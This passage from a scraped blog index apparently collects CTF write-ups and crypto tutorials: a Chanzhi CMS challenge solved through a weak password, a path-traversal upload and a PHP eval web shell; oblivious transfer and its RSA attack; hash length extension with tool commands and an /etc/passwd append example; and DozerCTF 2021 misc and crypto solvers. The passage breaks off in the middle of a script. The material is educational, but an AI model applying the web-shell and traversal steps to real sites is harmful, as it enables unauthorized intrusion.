56fkoP8KhwCf3v7CEz 得到 12t4tww3r5e77。加头即flag。 ​ Webeasycms 真·ezcms hint: 后台密码5位弱口令 蝉知cms，搜索知该cms存在后台任意文件读取与后台Getshell漏洞。 访问 admin.php，根据提示用 admin/12345 登进后台，在设计-高级里面可以直接编辑php模板文件： 在源码里加上一句话却发现需要验证用户权限： 如果编辑模板，需要管理员在cms的 /system/tmp 目录下新建一个名字为 xgem.txt 的文件来验证是否有写入权限。 在设计-组件-素材库可以上传素材，并且可以跨目录上传文件。本地新建一个 xgem.txt 文件，上传后把名称的参数改为 ../../../../../system/tmp/xgem： 再回到设计-高级模板编辑界面，尝试在首页模板文件 /var/www/html/system/tmp/template/default/index/index.html.php 中首行添加 &lt;?php phpinfo();?&gt;，保存。 回到首页发现执行成功： 将代码改为一句话 &lt;?php @eval($_POST[ccc]);?&gt;，蚁剑连接，在根目录访问文件 /flag 得到flag。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"不经意传输","slug":"crypto-不经意传输","date":"2021-06-20T04:07:57.000Z","updated":"2021-06-20T05:29:24.471Z","comments":true,"path":"2021/06/20/crypto-不经意传输/","link":"","permalink":"https://lazzzaro.github.io/2021/06/20/crypto-%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/","excerpt":"","text":"​ 不经意传输（Oblivious Transfer, OT）是一种可保护隐私的双方通信协议、接受者的隐私不被发送者所知道，使通信双方以一种选择模糊化的方式传送消息。抽象地讲，就是A给B发消息，A却不知道B收到的是啥，一般的思路就是A要多发一些消息然后让B去选择有需要的，如果是这样的话，同时还应该保证B不会多知道他本不应该知道的消息。不经意传输可以分为1选1、2选1、n选1、n选k多种不经意传输协议。 1选1A给B发送一条消息，B只有 $\\frac{1}{2}$ 的概率能够接受到真正的消息，且A不知道B是否真正接受了消息。 A取两个素数 $p,q$，计算 $n=pq$，将 $n$ 发送给B； B任取 $x,x \\in (0,n),\\gcd(x,n)=1$，计算 $a=x^2 \\bmod n$，将 $a$ 发送给A； A知道 $p,q$，可以计算 $a=x^2 \\bmod n$ 的四个根 $(x,n-x,y,n-y)$，从中随机挑选一个送给B； B若收到 $y$ 或 $n-y$，则可计算 $p,q$：$\\gcd(x+y,n)=p$ 或 $\\gcd(x+y,n)=q$； B若收到 $x$ 或 $n-x$，则B什么也得不到。 ​ 2选1A给B发送两条消息 $(m_0, m_1)$，B能够在不知道另外一条消息的内容的情况下得知其中一条消息的内容，且A不知道B选择的哪条消息。 RSA实现 A有两个秘密消息 $m_0,m_1$； A使用RSA算法，生成公钥 $(N,e)$ 对公开，私钥 $d$ 自己留着。公钥 $(N,e)$ 告知B； （每次通信的时候RSA都要重新生成一对公钥私钥） A产生两个随机数 $x_0,x_1$，并且将这两个随机数传输给B； B决定要获取的数字编号 $b=\\{0,1\\}$，以及产生一个随机数 $k$； B计算一个数字 $v=(x_b+k^e) \\bmod N$，并且将这个 $v$ 发送给A； A计算多个 $k_i$，其中一个 $k_i$ 将会等于 $k$： $k_0=(v-x_0)^d \\bmod N \\ k_1=(v-x_1)^d \\bmod N$ 由于此时 $v$ 并不是A产生的，所以此时的A并不知道哪一个 $k$ 是B需要的； A将生成的值与自己手上的信息进行相加，得到全新的信息： $m_0’=m_0+k_0 \\ m_1’=m_1+k_1$ 并将信息发送给B。因为此时每一个信息都增加了 $k_i$，所以B无法直接还原信息 $m$； B此时知道自己选择的信息编号 $b$，于是选出 $m_b$，计算出 $k_b$，并且用 $m_b=m_b’-k_b$ 得到此时的解密信息。 攻击 构造 $v$ 得 $m_0,m_1$ $v=\\cfrac{\\text{scale}^e \\cdot x_0-x_1}{\\text{scale}^e-1}$ 可使 $k_1=\\text{scale} \\cdot k_0$，因此 $\\text{scale} \\cdot m_0’-m_1’=m_0 \\cdot \\text{scale} -m_1$。 首先，如果恰巧随机数 $m_0$ 和 $m_1$ 都小于 $\\text{scale}$，那么直接可以从 $m_0 \\cdot \\text{scale} -m_1$ 将两者求出。 其次，如果 $\\text{scale}$ 取值不能取得太大，而导致两个 $m$ 总是比它大，那只能老老实实穷举可能的低字节，再向高字节搜索。 参考： Pwnhub - BabyOT Hackergame 2020 - 不经意传输 其他实现 A发送 $g^s$ 给B，B知道 $g$ 和 $g^s$ 也无法破译 $s$，因为DLP问题不存在高效解法； B基于 $i$ 生成 $L_i=\\begin{cases} g^k ,&amp; i=0 \\ g^{s-k} ,&amp; i=1 \\end{cases}$； B发送 $L_i$ 给A，A知道 $g$ 和 $g_k$ 也无法破译 $k$，因为DLP问题不存在高效解法。 因此，A无法知道B发来的是 $g_k$ 还是 $g_{s-k}$，也就无法知道 $i$； A生成 $C_0,C_1$： $C_0=(g^{r_0},(L_i)^{r_0} \\oplus v_0)\\ C_1=(g^{r_1},(\\frac{g^s}{L_i})^{r_1} \\oplus v_1)$ A发送 $C_0,C_1$ 给B，B知道 $g,g^{r_0},g^{r_1}$ 也无法破译 $r_0,r_1$，因为DLP问题不存在高效解法。 B解密 $v_i$： (1) 对于 $i=0$ 的情形： B可以通过如下方式解密获得 $v_0$： $C_0[0]^k \\oplus C_0[1]=(g^{r_0})^k \\oplus (L_i)^{r_0} \\oplus v_0=(g^{r_0})^k \\oplus (g^k)^{r_0} \\oplus v_0=v_0$ B无法获得 $v_1$ 因为 $C_1[1]=(\\frac{g^s}{L_i})^{r_1} \\oplus v_1=g^{(s-k)r_1} \\oplus v_1$，而 B不知道 $s,r_1$。 (2) 对于 $i=1$ 的情形： B可以通过如下方式解密获得 $v_1$： $C_1[0]^k \\oplus C_1[1]=(g^{r_1})^k \\oplus (L_i)^{r_1} \\oplus v_1=(g^{r_1})^k \\oplus (g^k)^{r_1} \\oplus v_1=v_1$ B无法获得 $v_0$ 因为 $C_0[1]=(L_i)^{r_0} \\oplus v_0=g^{(s-k)r_0} \\oplus v_0$，而 B不知道 $s,r_0$。 因此，B只能解密 $v_i$ 而不能解密 $v_{1-i}$。","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"OT","slug":"OT","permalink":"https://lazzzaro.github.io/tags/OT/"}],"author":"Lazzaro"},{"title":"哈希长度扩展攻击","slug":"crypto-哈希长度扩展攻击","date":"2021-06-01T16:02:52.000Z","updated":"2022-06-01T16:25:46.363Z","comments":true,"path":"2021/06/02/crypto-哈希长度扩展攻击/","link":"","permalink":"https://lazzzaro.github.io/2021/06/02/crypto-%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/","excerpt":"","text":"​ 哈希长度扩展攻击原理 在密码学和计算机安全中，长度扩展攻击（Length extension attacks）是指针对某些允许包含额外信息的加密散列函数的攻击手段。 该攻击适用于在消息与密钥的长度已知的情形下，所有采取了 H(key||message) 此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgård构造的算法均对此类攻击显示出脆弱性。 攻击的要点在于： 攻击者可以控制message 攻击者需要知道key的长度，如不知道可以考虑暴力破解 攻击已经知道了包含key的一个消息的hash值 hash算法使用了Merkle–Damgård construction进行数据的压缩（比如MD5、SHA-1等）并采取 H(key||message) 构造 攻击可以达到的效果在于，如果知道一个原消息哈希值 H(key||M1) 及其 key||M1 长度，对于任意的字符串M2，攻击者可以计算出 H(pad(key||M1) + M2) 的值，而不需要知道是 key 及 M1 是多少。 以区块为单位操作数据（MD5, SHA1, SHA256的区块长度是512 bits，大多数message的长度不会刚好可以被哈希函数的区块长度整除。这样一来，message就必须被填充(padding)至区块长度的整数倍）。 每个消息块都会和一个输入向量做一个运算，把这个计算结果当成下个消息块的输入向量 ，初始化向量是定义好的，在最后一块的时候，才会将其对应的链接变量转换为hash值。 由已知的MD5值逆向得到对应的链接变量，利用得到的链接变量对填充后的新加的消息进行哈希算法，最后得到hash值。 步骤 MD5操作流程： 用 md5 函数作为例子。 md5 算法在计算的时候会初始化四个寄存器 A、B、C、D，分别有自己的初始值： 1234word A: 01 23 45 67word B: 89 ab cd efword C: fe dc ba 98word D: 76 54 32 10 md5 算法是以 512bit 为一个块进行迭代计算的，第一个块计算完后，四个寄存器的值就会被更新，如果还存在下一个块，就会在现在四个寄存器里面的数值的基础上继续迭代计算，等全部的块计算完成后，四个寄存器中的十六进制连接起来，就是最终的 MD5 值。换句话说，也就是当第一个块计算完成后，此时四个寄存器中存储的就是第一个块的 MD5 值，接着在这个基础上继续迭代计算下一个块。 如果当前的数据长度不满足对 512bit 求余为 448bit 的时候，需要补至满足这个条件，填充的方法如下： 首先补一个 1（二进制位上的一个 1，不是十进制的 1） 接着在后面补 0（同样是二进制位上的 0），直到满足比特长度对 512 求余为 448 这个条件。 接着补 64bit 的长度，这个长度是在补 1 和 0 以前的长度，如果长度超出了 64bit，那么就取低 64bit。换句话说：补完的一个块可能是这个样子的： raw_data + &#39;\\x80&#39; + &#39;\\x00&#39;*n + &#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#39; 第一个 raw_data 的部分就是原始的数据，第二个部分 \\x80 是一开始补的一个二进制位 1，接着补若干个 \\ x00，直到整个长度达到 56Byte，最后的 8Byte 就是 raw_data 的长度，如果 raw_data 的长度超过了 2^64bit，则取低 64bit。 MD5 算法中的补位的这部分，就是实现长度扩展攻击的关键。 通过长度扩展攻击，我们可以利用 md5 的一些 trick 绕过这个限制。这个问题实际上变成了：如何在不知道 salt/key/secret 的情况下，计算出一个文件名的合法 hash 值。 通过前面对 md5 算法的了解，我们知道，当一个块计算完成后，ABCD 四个寄存器中的值就是刚计算完的 hash 值，如果后面还有数据块，那么会在已有的 ABCD 四个寄存器中的值上进行更新。 那么如果我们将 ABCD 四个寄存器中的值设置为 test.pdf 对应的 hash 值，那么就相当于 MD5 的计算过程中，已经完成了对前一个块的计算，接着向下计算就可以了。 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;openssl/md5.h&gt;int main(int argc, const char *argv[])&#123; int i; unsigned char buffer[MD5_DIGEST_LENGTH]; MD5_CTX c; MD5_Init(&amp;c); MD5_Update(&amp;c, &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;, 64); c.A = 0x9b104365; c.B = 0xf78738b5; c.C = 0x42fe46bb; c.D = 0x4ae2264f; MD5_Update(&amp;c, &quot;/../../../../etc/passwd&quot;, 23); MD5_Final(buffer, &amp;c); for (i = 0; i &lt; 16; i++) &#123; printf(&quot;%02x&quot;, buffer[i]); &#125; printf(&quot;\\n&quot;); return 0;&#125; 里面的 64 个 A 无所谓是什么，只是为了让 MD5 进行一个块的计算，然后我们将四个寄存器中的值改掉，注意大小端。然后计算附加数据的 MD5。 工具 HashPump：https://github.com/bwall/HashPump 123456789101112131415$ hashpump -hHashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength] HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack. -h --help Display this message. -t --test Run tests to verify each algorithm is operating properly. -s --signature The signature from known message. -d --data The data from the known message. -a --additional The information you would like to add to the known message. -k --keylength The length in bytes of the key being used to sign the original message with. Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support. &lt;Developed by bwall(@botnet_hunter)&gt; $ hashpump -s &#x27;6d5f807e23db210bc254a28be2d6759a0f5f5d99&#x27; --data &#x27;count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo&#x27; -a &#x27;&amp;waffle=liege&#x27; -k 140e41270260895979317fff3898ab85668953aaa2count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02(&amp;waffle=liege hash_extender：https://github.com/iagox86/hash_extender 12345let secret = &quot;secret&quot;let data = &quot;data&quot;let H = md5()let signature = hash(secret || data) = 6036708eba0d11f6ef52ad44e8b74d5blet append = &quot;append&quot; 12345$ ./hash_extender --data data --secret 6 --append append --signature 6036708eba0d11f6ef52ad44e8b74d5b --format md5Type: md5Secret length: 6New signature: 6ee582a1669ce442f3719c47430dadeeNew string: 64617461800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005000000000000000617070656e64 hexpand：https://github.com/amlweems/hexpand 1234567891011121314Usage: hexpand -t type -s signature -l length -m message hexpand --testOptions: -t --type the hash algorithm for expansion (md5, sha1, sha256, or sha512 -s --sig the result of the original hash function -l --length the length of the original message -m --message the message to be appended --test runs a set of test cases $ ./hexpand -t md5 -s cd9fb5c3a20e29b2b2846deaa845c426 -l 55 -m &quot;\\nP.S. Tell Eve our secret plan&quot;Append (hex): 80b8010000000000005c6e502e532e2054656c6c20457665206f75722073656372657420706c616e2eSignature: 69b0e397b5588c86aa9751b56f2c6943 参考 哈希长度扩展攻击","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"hash","slug":"hash","permalink":"https://lazzzaro.github.io/tags/hash/"}],"author":"Lazzaro"},{"title":"DozerCTF 2021","slug":"match-DozerCTF-2021","date":"2021-05-30T14:23:15.000Z","updated":"2021-05-30T16:54:45.628Z","comments":true,"path":"2021/05/30/match-DozerCTF-2021/","link":"","permalink":"https://lazzzaro.github.io/2021/05/30/match-DozerCTF-2021/","excerpt":"","text":"​ 比赛时间：2021年5月29日 9:00-2021年5月30日晚21:30比赛平台：http://1.14.160.21:8000/ Web几乎全是域渗透，Crypto几乎全是AES。 Rank: 12 Misc不会有人以为re那道才是签到吧 欢迎参加DozerCTF 2021 https://www.bilibili.com/video/BV1VK4y1G7HQ 视频中后段有闪过的flag，拼手速暂停大法。 ​ detective_novel 听说扫一扫就有flag flag.png 分离出 zip压缩包，在 novel 目录下有两个文件 flag.jpg 和 hint.png。 hint.png 分离出另一个 zip压缩包，检查发现头部错误且包含伪加密，修复头部 504B03040A000900 为 504B030414000000 ，在 easy_riddle 目录下有两个文件 hint.txt 和 letter.png。 letter.png 福尔摩斯使用过的跳舞小人密码，解出 DOZER，再结合之前 hint.png 内文字 guess what can you get !!!，用 outguess 从 flag.jpg 提取文件得flag： outguess -r flag.jpg -k DOZER -t out.txt ​ ezmisc 看不到看不到 xiaojiejie.jpg 分离出一张gif图片和一张png图片。 gif图片分帧分别扫二维码拼接得前半段 Dozer&#123;is_it_simple，png二维码图片扫码发现文字中间有不可见字符，猜测为零宽隐写，使用 unicode_steganography 提取字符： 123var s = unicodeSteganographers.setUseChars(&#x27;\\u200b\\u200c\\u200d\\u200e\\u200f&#x27;);s.decodeText(&quot;我已经看见了，​​​​‎‏​​​​​‏​‍​​​​‏‍‌​​​​‏‍‏​​​​‎‏​​​​​‏‏‌​​​​‏‍‌​​​​‏‎‍​​​​‌‌‎​​​​‎‏‏​​​​‏‍‌​​​​‏‍​​​​​‏​‎​​​​‏‍‏​​​​‎‏‍​​​​‏‎‌​​​​‏‎‍​​​​‏‌‎​​​​‎‏‍​​​​‏‎‌​​​​‏​‌​​​‌​​​你呢？&quot;) 解出后半段 _for_you!congratulate&#125; ​ funny_pixel 听说国赛有一个running_pixel? 按提示参考ciscn题，提取218张图片里的0/1，可按照0/1图案颜色（RGB: EFEF27）计算像素数来识别： 12345678910111213141516171819from PIL import Imageflag = &#x27;&#x27;for name in range(1,219): count = 0 framepic = Image.open(f&quot;./funny_pixel/&#123;name&#125;.png&quot;) framepic = framepic.convert(&quot;RGB&quot;) width,height = framepic.size for w in range(width): for h in range(height): if framepic.getpixel((w,h)) == (0xef,0xef,0x27): count += 1 print((name,count)) if count != 10 and count != 5: print(name) break flag += &#x27;0&#x27; if count == 10 else &#x27;1&#x27; #01000100011011110111101001100101011100100100001101010100010001100111101101000100001100000101111101111001010011110101010101011111010011000100100101101011011001010101111101010000011010010111100001000101011011000111110111 观察得到的0/1字符串，1000100 = D，1101111 = o，类推知每个字符7位二进制中间用0分隔，提取转回字符即为flag：DozerCTF&#123;D0_yOU_LIke_PixEl&#125;。 ​ 一点也不杂 出题人说，这个题目一点也不杂 三个文件，flag分三部分。 第一部分，5月日历+图片尾部13组数字，在日历上连线出猪圈密码图案，对照解出 DOYOUKNOW_CRT。 第二部分，简单中国剩余定理(CRT)应用，Sage运行crt([2,2,9,16],[5,7,17,23])，得key=5007。 第三部分，直接base85解码得 _good_over&#125; 加头 DozerCTF&#123; 拼接为flag。 ​ 做个问卷吧 赛题基本上线完毕，感谢参加DozerCTF 2021! 问卷：https://tp.wjx.top/vj/t2bF3sc.aspx 反馈+吐槽。 ​ CryptoHorcrux Harry Potter &amp;&amp; Aquila AeroCTF 2021原题，构造结式解椭圆曲线方程组+LLL算法+恢复参数值，参考： AeroCTF 2021 - Horcrux 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122from sage.all import *proof.arithmetic(False)p = 0x95a599ab706381e861caf2c6e757204c704b77a38592ae0db282000d8537ab0e4608ecd9a524ad6e14eb9564353b5c1036ff13c8503bfad7e8695d0bcf15df766c1be64aa4e73b75e0ecb28ea9e74eafc613d2fb9299fac060826bd071a92d2bd5be44d6d65e6b63146d617e800b79e25358b4a3e22a62457f2d39c21a694f54c03ad5d69a674fa6cd91c2971524152c1b6d177c455e0f255ce4fa18253da252613959c17b49ac422a9009933d0c59210646fca85e8ae35d5df34d6afde9d951909585c3f3e53e06ef5ae319fa035e57941599c2a73133bba490b66ab38e7537fd3ed322bf3a0431f02f276b5b18b623865883e3f0b67a511293b5a7576c97e6663cb1c32bdff5cda825549742d067e1b4ca847c75ef6b601feced3a9bb4dea41f1e5c40a8f2af2983f010d7bbc9ba992cedcdac6922a056d52873af110ae578da5e875fa6a121cdb45fe5e8198c121f7e9609d100d023a9155d6aa9efe28aa9036079564780db663aad36796ee8349b98b11d1b108125F = GF(p)x0 = F(0x93436a2bdfecc923d69385f164ef891ef5b08418e5b4e65c980e0b054e86ee8b8e24a527dad9fe3883234179167ada4b5f413c07c548f3dc224db1f2791c8a44bb857c722676d621fa07ad4beee4dc2be679c351cc19423aaff444e5c908b767d9ebec006bf0f020b8c0d15775fc84524333c47d4bc46ae8bd3cb18e1b037e59a388e39a81c1d97c9654742979ed54741df9aba6954c2801efb63d91ed1a51889ee1e8848b7bf111c987cb558e08b9caa17e50f578fa0af70bf855393dcc6c52420897eae663700818dbec237e094c1d4904a249d92702ab4046e52694db73a5fb83953262dff0251fa5fd1b4a99fb70addcde2a38d8766e02360b7b29aad1382ecdd63650f2b597469267dccc11ee7d0b10178c68a02b2d03db5bfcd6d663c11bc2ef855e30528aec48a9f4f53f71c52ac6e0c92fcaf0f8576982b1135bbb15fb5035c7853de51b8aa5b858646dd23b7b01d837c6b3c38f4bdcef6009ee02456bbdcbe8978eb400326c4fd0a899ed9f559ba963b25317)y0 = F(0x47b8c9d33929bfe12657a2f482213cca803fe37e8485ebde814dc91ce56ed480cea04f24176edce77ebfd7d9bba3a864cfe6176ef1d68ebc184dcde0667704adc472d1d16688affa657cff460edf05f92dad743ca3421150ec7ef98e08a9d17af033a555ed49f0e9c7457bf339a9270e8b44b7b75dd43afd27614d0ce59878c019d902d9ed23a26f04a431130534f85b05db586fd9a65a178204eb7d568a0e64dd16a369d2af6f2b8cd32a9e9be8322885c78a30dc8019ca3c48f39bad38de4ab60970ee1c44688d2afa901f46af7d2e7ced0e34204d6b38330fd87d6bf5bb61378e092780a48b985654de1c65b0a6146a82f84bfe09359820942980ce5c607bfc14497a79436bc4f351ae697875d93049c30dafc698208a17f9b785aa35448e4ef341102053c62a9923287f4cf597ff492fd0eac4ef77ae879a22c6c8a3a53baef09f574316fd872e1a6dd1ad9eb72a3e39f925e25fe06f7983b785dcb110bd127c8e2736e7345fd7ffce687c66c492a541e00c500574)x1 = F(0x37a181d88a683e2eeba3147bfb3043be6067fc722b8578255e25a335fadda9ead31c41d7742dbf3df7e4c3effc9297ef528730b3d8920978e342e123b9f19ab15a5ed2c19c45aaee728e53acd8c44e7543c4b9bcd40f27b8efac1a1e431ddbab15b4341c6cc817516634c2ab1117e784e429b9f797963b18442127342455d469ca9d9ff24b241afe9b7fdd4b91bb9750710e6f00b9fe631c1db71c308ef4642251fc00d0433910161d588c100944d55935ddf7dc656cc1670065c5bc6607358304c228f8495cca579a3a78102b4e617687f3aad0c5826e3aa7a85c85c99af2254002d3578c0af342ea1f49b9a425eba90e2473470fec77a945b45cf67dde9cb4e0ef445b974164cbcb61ec7cbcd77c94d42c6dce15ae500e4b6b15d38923ba2773176ae1e3354baaae47b422ec0ff8273538ad0a6a03a33d60a52257698130f6db6baaa4d338e167443eb4ac1b57b0d6f424e9d0b2f6b6b0df609b81150928286443afe7d1b9bbb30389af0db1597945d233cd19121d11)y1 = F(0x7696ea73e7345896be516aac44aa8ba35242babc3853a2a3fbf7081a3f5a845dba81f01d7aba946f7a9886eb1918d367baa87f387e86e095bb88bbc44f58768e8c2db3a1926301c984ea19f8e680fb7f4f7108c4c8565fc7cb66284bdf81e547e446faa80e88a59ceae3bb43b2c6ac1f8858e5f126fcc224f62aef611184d714db86a5c19060e0a9844def0e047d3a46e9d64f42c0cef9f85812068d580f9722b1520c2847b34c6ed7afc89b633113606aa397c10f1ea653e4d15fb160f2c1d4750a6c4eaef7e6fa56c35d393fe7d3ef91fc9ea56a69fd9614e8c39da6dc0981c6004468db1d81a13ebaf3bfd9e640c39b63b107605ba28a5c18b4a03ca627102ff63ddc8483dce2c06e97f614a4d93f9d615f849a6ce0c164217dabe849ceaf1ade997700daf9aca95f7811cc615cf61887e199ddf963a780829cc186b96d96f2b3c1f001eaa0e289b7fc79e5c24ce2aad55f9adb9ecaacba5445773222aee3cf997c171f7bcbcba65caa6c254186a1fa1982521d8ab1)x2 = F(0x3117ba57d46bd2da19fed7e3f087ec252b45340c1a338a5096a94538be0f9776388ec70cc22c475968a352f2a34f1637b660aea2f5a741d925d550b9bc91f3b5da0e9b6585aee5413d89f6734651439f7c6905c2b98b7e4aef425a50852b626ad7bd2a4f67909acc0d6ac7e33688f3cf676ac3c00a32e12eecb384cd9b099244c2ef37f054a271a2c174f3eac5553415b097ee84b590258df022d1142b28be0ca756784bfae2e42a1bf98a3c48ea9baa2466172673b978d1372a2ac5e20ff869dacbbfe0f56d4d4de947d39a5bb643cd3b00c1e6d4b82e090105358fc105f75ee1dec962696ef406474d5934ed27e375952012bf797ebd8fff2d4b08935086850fc89039b3c4c0ab712a9859c6e43dad3fae4c5048d60a5069c338a63ac49f3a7fa99614bd8a17a9522c82333ecaf88c41b0b8be60ebee5b52df4d853ef397786a113b5064e236299e795dbec72baf001c6dd973e424e86e79368d6b10f3b43a47eb8fae6e48c2b42aa7e2566879f9b675e4837a59366b)y2 = F(0x1e6d85c241d60abc738c606cc4237a617f7a341934d59cd0a3becbb1f4acdc740673a84df7646d1afd08d0d132d8188a35eca0ca8bee5208b73b141de1c4a4a254c6f6278f6860d8d40d9eb301281373dadb1e9bfbeeaa4b0b1ef48b787b47a490cce2f2c64d03a61036ebe565fe4f93dec2e030ecf1a91d1c65b82dfca045b07c526a87293d4844d92327669ca19a2a2e62d4e6e9d46d24d0994434e52f2ea1e9492d46039959afa75365d88e90ab13097f075c4a93d102514cac901ca760155152788e5d352c09e012f6d87fb262d3db9174014c2d9c88e289c902700dc202b05c0600b3f96be0ffc10ae58738718fee7c21e387ddf390a9a1e26a6cb2b744971b67621c1211f0127969a969318beb60a361b924db7707b4170ed3af22dc412d15eb71c553dc79dbebc238dc2baecea806351288b05db9f6885cc53af7509aa3c810540e648ff5e94ba75bf0dbf097d515babe0f99dcd4ddcc10f7a6549a3f12148ca51e4f4f5ab16bf0cb5c069b2cd87c1738bce308)BITS = 32R = PolynomialRing(F, names=&#x27;aa1, aa2, bb1, bb2, a, b&#x27;)aa1, aa2, bb1, bb2, a, b = R.gens()bounds = dict(aa1=2**BITS, aa2=2**BITS, bb1=2**BITS, bb2=2**BITS)eq0 = x0**3 + a*x0 + b - y0**2eq1 = (x1 + aa1)**3 + a*(x1 + aa1) + b - (y1 + bb1)**2eq2 = (x2 + aa2)**3 + a*(x2 + aa2) + b - (y2 + bb2)**2def resultant(p1, p2, var): p1 = p1.change_ring(QQ) p2 = p2.change_ring(QQ) var = var.change_ring(QQ) r = p1.resultant(p2, var) return r.change_ring(F)poly = eq0poly1 = resultant(poly, eq1, b)poly2 = resultant(poly, eq2, b)poly = resultant(poly1, poly2, a)poly /= poly.coefficients()[0]print(poly.monomials())bits = 0for mono in poly.monomials(): mono_bits = RR(log(mono.change_ring(ZZ).subs(**bounds), 2)) print(mono, &quot;%.2f&quot; % mono_bits ) bits += mono_bitsn = len(poly.monomials())m = matrix(ZZ, n, n)m[0] = vector(poly.coefficients())m[1:,1:] = p * identity_matrix(n-1)def prmat(m): for row in m: print(*[&#123;0: &quot;0&quot;, 1: &quot;1&quot;, p: &quot;p&quot;&#125;.get(v, &quot;x&quot;) for v in row])prmat(m)monos = vector(poly.change_ring(ZZ).monomials())factors = [mono(**bounds) for mono in monos][m.rescale_col(i, factor) for i, factor in enumerate(factors)]m = m.LLL()m = m.change_ring(QQ)[m.rescale_col(i, QQ(1)/factor) for i, factor in enumerate(factors)]m = m.change_ring(ZZ)polys = []for pol in m*monos: maxval = sum( (abs(int(coef)) * mono).change_ring(ZZ).subs(**bounds) for coef, mono in pol ) print(&quot;polynomial with max value&quot;, RR(log(maxval, 2)), &quot;bits&quot;) if maxval &lt; p: polys.append(pol)print(&quot;got&quot;, len(polys), &quot;polynomials&quot;)def recover(hs, vars, solbits, padbits=20): nbits = solbits + padbits from itertools import product sols = &#123;(0,) * len(vars)&#125; polys = [h.change_ring(Zmod(2**nbits)) for h in hs] for i in range(nbits): print(&quot;bit&quot;, i, &quot;/&quot;, nbits, &quot;:&quot;, len(sols), &quot;candidates&quot;) sols2 = set() mod = 2**i polys = [h.change_ring(Zmod(2*mod)) for h in hs] for bits in product(range(2), repeat=len(vars)): for sol in sols: sol2 = tuple(ss + bit*mod for ss, bit in zip(sol, bits)) if any(poly(*sol2) for poly in polys): continue sols2.add(sol2) sols = sols2 if not sols: print(&quot;fail&quot;, i) return print(&quot;sols?&quot;, i, len(sols)) # TBD: automate adding pad bits to determine right sols by smallness for sol in sols: # fix signs sol = [v if v &lt; 2**(nbits-1) else (v-2**nbits) for v in sol] # too large solution if any(abs(v) &gt;= 2**solbits for v in sol): continue # wrong solution if any(poly(*sol) for poly in hs): continue yield sol R = PolynomialRing(ZZ, names=&#x27;aa1, aa2, bb1, bb2&#x27;)polys = [R(pol) for pol in polys]sols = list(recover(polys[:4], R.gens(), BITS))from struct import packct = bytes.fromhex(&quot;1df819824bb4299817560c5ee69bd8eaabaf3c47e33a57e39eb1ccddec66d9fb38c6df8ebf35b368ebeecd803d66afb2&quot;)sol_aa1, sol_aa2, sol_bb1, sol_bb2 = sols[0]parts = [ (int(x1)+int(sol_aa1))^^int(x1), (int(y1)+int(sol_bb1))^^int(y1), (int(x2)+int(sol_aa2))^^int(x2), (int(y2)+int(sol_bb2))^^int(y2),]key = pack(&quot;&gt;4I&quot;, *parts)print(AES.new(key, mode=AES.MODE_ECB).decrypt(ct).decode())#DozerCTF&#123;B3y0ND_ThE_4QUIL4_2IFT&#125; ​ 手滑的袁学长 袁学长出题的时候不小心把密文给删掉几位，现在用$替换了一下，凑活看吧 代码逻辑： 123456789101112131415161718192021plain:I do not care the result2?9cf037f8b3a?2b19b5bda978c294?5\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00key:2?9cf037f8b3a?2b19b5bda978c294?5encrypt:91e5fb43f053b21ce12e41df0b0ae0bb6a20c55719151$$fccecb4$$$$$2a27c8c582c6704f$$$$153bd3313b84235ace16a7b3b190$e487abfa9$cf379d1a3calgorithm:c1 = AES(key, p1^f2), e1=c1^f1c2 = AES(key, p2^c1), e2=c2^p1c3 = AES(key, p3^c2), e3=c3^p2c4 = AES(key, p4^c3), e4=c4^p3flag = f1+f2 从 key 和 e4 入手爆破，未知位数3+2=5层循环（16^5=1048576），根据已知条件，枚举求出flag： 123456789101112131415161718192021222324252627282930313233343536from Crypto.Util.strxor import *from Crypto.Cipher import AESimport stringdic = &#x27;0123456789abcdef&#x27;def xor_hex(s, t): return strxor(bytes.fromhex(s),bytes.fromhex(t)).hex().rjust(32,&#x27;0&#x27;)for key1 in dic: for key2 in dic: for key3 in dic: key = &#x27;2&#123;&#125;9cf037f8b3a&#123;&#125;2b19b5bda978c294&#123;&#125;5&#x27;.format(key1,key2,key3) p1 = b&#x27;I do not care th&#x27;.hex() p2 = b&#x27;e result&#x27;.hex() + key[:8].encode().hex() p3 = key[8:24].encode().hex() p4 = key[24:].encode().hex() + &#x27;08&#x27;*8 for e41 in dic: for e42 in dic: e4 = &#x27;e16a7b3b190&#123;&#125;e487abfa9&#123;&#125;cf379d1a3c&#x27;.format(e41,e42) c4 = xor_hex(e4, p3) c3 = xor_hex(p4, AES.new(bytes.fromhex(key), AES.MODE_ECB).decrypt(bytes.fromhex(c4)).hex()) #e3 = 8c582c6704f$$$$153bd3313b84235ac e3 = xor_hex(c3, 